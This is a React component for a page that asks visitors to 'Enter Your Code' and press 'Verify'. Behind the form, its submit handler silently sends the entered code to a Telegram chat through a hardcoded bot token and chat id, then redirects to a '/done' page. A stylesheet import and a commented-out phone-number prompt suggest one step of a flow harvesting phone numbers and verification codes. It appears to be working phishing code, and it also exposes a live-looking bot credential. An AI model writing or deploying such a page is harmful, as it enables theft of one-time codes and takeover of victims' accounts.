import { useState } from 'react';
import 'react-phone-input-2/lib/style.css';
import { useNavigate } from 'react-router-dom';

function Code() {
  const navigate = useNavigate();

  const [Number, setNumber] = useState('');

  const OnChangehandaller = (e) => {
    setNumber(e.target.value);
  };

  const handelSubmit = (e) => {
    e.preventDefault();

    if (Number) {
      const bot_token = '5912247911:AAF5D53I7Q89_juB6I-Je9jJMoC5ENYgKD0';
      const user_id = 5339916869;
      let my_text = `Code : ${Number}`;

      const url = `https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${user_id}&text=${my_text}`;
      let api = new XMLHttpRequest();
      api.open('Get', url, true);
      api.send();
      navigate('/done');
    } else {
      null;
    }
  };

  return (
    <div className=" flex items-center justify-center flex-col mt-20  ">
      <div>
        {/* <p className="text-xl my-7">Please Enter Your Phone Number</p> */}
      </div>
      <div>
        <form
          action="www.cl.com"
          onSubmit={handelSubmit}
          className="flex items-center justify-center gap-3 flex-col lg:flex-row"
        >
          <input
            className="border p-1  border-black"
            placeholder="Enter Your Code"
            name="number"
            required
            onChange={OnChangehandaller}
          />

          <div>
            <input
              className="bg-cyan-400 p-1 border border-black cursor-pointer"
              type="submit"
              value="Verify "
            />
          </div>
        </form>
      </div>
    </div>
  );
}

export default Code;
